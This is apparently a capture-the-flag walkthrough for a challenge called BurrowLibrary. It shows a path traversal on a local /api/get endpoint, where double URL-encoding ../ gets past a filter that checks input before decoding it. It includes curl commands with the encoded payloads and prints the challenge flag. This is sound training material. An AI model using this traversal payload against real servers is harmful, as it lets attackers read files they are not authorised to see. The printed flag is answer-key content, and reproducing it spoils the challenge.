# Walkthrough — BurrowLibrary

## Quick summary
The `/api/get` endpoint sanitises the percent-encoded input **before** decoding it. By double URL-encoding the `../` traversal sequence you bypass the naive filter; after decoding the server processes `../` and the request reaches `/flag.txt`.

---

### Observations
- Visiting `http://127.0.0.1:8080` shows the BurrowLibrary UI and links to public files (e.g. `echidna.txt`).
- Clicking a file returns a plain text file via `/api/get?file=<name>`.
- A simple `../` traversal is blocked and returns 404.
- Single URL-encoding the `../` characters (`%2E%2E%2F`) is still detected/blocked by the application.
- Double URL-encoding (`%252E%252E%252F...`) hides the `../` from the sanitiser; after the server decodes the value the `../` sequences reappear and the path traversal succeeds.

---

### Steps

1. Confirm the service is running and list a public file:
```bash
curl "http://127.0.0.1:8080/api/get?file=echidna.txt"
```
   
2. Attempt a normal traversal (expected to fail):
```bash
curl "http://127.0.0.1:8080/api/get?file=../../../flag.txt"
```

3. Try single URL encoding (still blocked):
```bash
curl "http://127.0.0.1:8080/api/get?file=%2E%2E%2F%2E%2E%2F%2E%2E%2Fflag.txt"
```

4. Use the **double-URL-encoded** payload (works):
```bash
curl "http://127.0.0.1:8080/api/get?file=%252E%252E%252F%252E%252E%252F%252E%252E%252Fflag.txt"
```

5. Expected response:
```bash
flag{8urr0w_p45t_b4d_f1l73r5}
```